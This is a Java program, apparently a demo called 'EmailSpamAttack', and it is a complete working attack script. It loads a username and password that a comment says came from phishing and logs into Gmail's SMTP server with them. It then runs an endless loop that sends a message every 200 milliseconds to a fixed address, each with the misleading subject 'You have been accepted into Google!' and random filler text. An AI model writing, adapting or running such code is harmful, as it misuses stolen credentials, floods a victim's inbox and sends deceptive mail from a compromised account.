package com.secres.maildemo;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.Properties;
import java.util.Random;

import jakarta.mail.Message;
import jakarta.mail.MessagingException;
import jakarta.mail.Multipart;
import jakarta.mail.Session;
import jakarta.mail.Transport;
import jakarta.mail.internet.AddressException;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeBodyPart;
import jakarta.mail.internet.MimeMessage;
import jakarta.mail.internet.MimeMultipart;

/**
 * Demo of spam attack.
 * 
 * @author Pranav Amarnath
 * @version April 18, 2021
 *
 */
public class EmailSpamAttack {

	private String USERNAME;
	private String PASSWORD;
	private final String PATH = "/credentials.txt";
	private Session emailSession;
	private Transport emailTransport;

	/**
	 * Constructor that uses Jakarta Mail to access emails.
	 */
	public EmailSpamAttack() {
		try {
			readMail();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Reads the mail and sets up IMAP.
	 * 
	 * @throws MessagingException
	 */
	private void readMail() throws MessagingException {
		readFile();

		// create properties field
		Properties properties = System.getProperties();
		properties.setProperty("mail.user", USERNAME);
		properties.setProperty("mail.password", PASSWORD);
		properties.put("mail.smtp.ssl.enable", "true");
		properties.put("mail.smtp.starttls.enable", "true");
		properties.setProperty("mail.smtp.host", "smtp.gmail.com");
		properties.setProperty("mail.smtp.port", "465");
		properties.setProperty("mail.smtp.auth", "true");

		emailSession = Session.getDefaultInstance(properties);
		
		emailTransport = emailSession.getTransport();
		emailTransport.connect(USERNAME, PASSWORD);

		startLoop(); // start loop for incoming messages
	}

	/**
	 * Read the file acquired from phishing.
	 */
	private void readFile() {
		try {
			BufferedReader br = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream(PATH), "UTF-8"));
			try {
				String line = "";
				int i = 0;
				while((line = br.readLine()) != null) {
					if(i % 2 == 0) {
						USERNAME = line;
					}
					else {
						PASSWORD = line;
						break; // Even if there are other usernames and passwords, we only want the first pair.
					}
					i++;
				}
			} finally {
				br.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Creates a new {@link Thread} to enter idle mode.
	 */
	private void startLoop() {
		System.out.println("[LOG] Started IDLE loop.");
		new Thread(() -> {
			while(true) {
				try {
					System.out.println("[LOG] Sending mail...");
					// Send a mail with random 12 letters.
					sendEmail(System.getProperties(), "pranny2k@gmail.com", "You have been accepted into Google!", String.join(" ", generateRandomWords(12)), new File[] {});
				} catch (AddressException e) {
					e.printStackTrace();
				} catch (MessagingException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
				System.out.println("[LOG] Sent mail!");
				try {
					Thread.sleep(200); // Wait time
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}).start();
	}

	private String[] generateRandomWords(int numberOfWords) {
		String[] randomStrings = new String[numberOfWords];
		Random random = new Random();
		for(int i = 0; i < numberOfWords; i++) {
			char[] word = new char[random.nextInt(8) + 3]; // words of length 3 through 10. (1 and 2 letter words are boring.)
			for(int j = 0; j < word.length; j++) {
				word[j] = (char) ('a' + random.nextInt(26));
			}
			randomStrings[i] = new String(word);
		}
		return randomStrings;
	}

	private void sendEmail(Properties smtpProperties, String toAddress, String subject, String message, File[] attachFiles) throws AddressException, MessagingException, IOException {
		// creates a new e-mail message
		Message msg = new MimeMessage(emailSession);

		msg.setFrom(new InternetAddress(USERNAME));
		InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
		msg.setRecipients(Message.RecipientType.TO, toAddresses);
		msg.setSubject(subject);
		msg.setSentDate(new Date());

		// creates message part
		MimeBodyPart messageBodyPart = new MimeBodyPart();
		messageBodyPart.setContent(message, "text/html");

		// creates multi-part
		Multipart multipart = new MimeMultipart();
		multipart.addBodyPart(messageBodyPart);

		// adds attachments
		if(attachFiles != null && attachFiles.length > 0) {
			for(File aFile : attachFiles) {
				MimeBodyPart attachPart = new MimeBodyPart();

				try {
					attachPart.attachFile(aFile);
				} catch (IOException ex) {
					throw ex;
				}

				multipart.addBodyPart(attachPart);
			}
		}

		// sets the multi-part as e-mail's content
		msg.setContent(multipart);

		// sends the e-mail
		msg.saveChanges();
		emailTransport.sendMessage(msg, toAddresses);
	}

	public static void main(String[] args) {
		new EmailSpamAttack();
	}

}
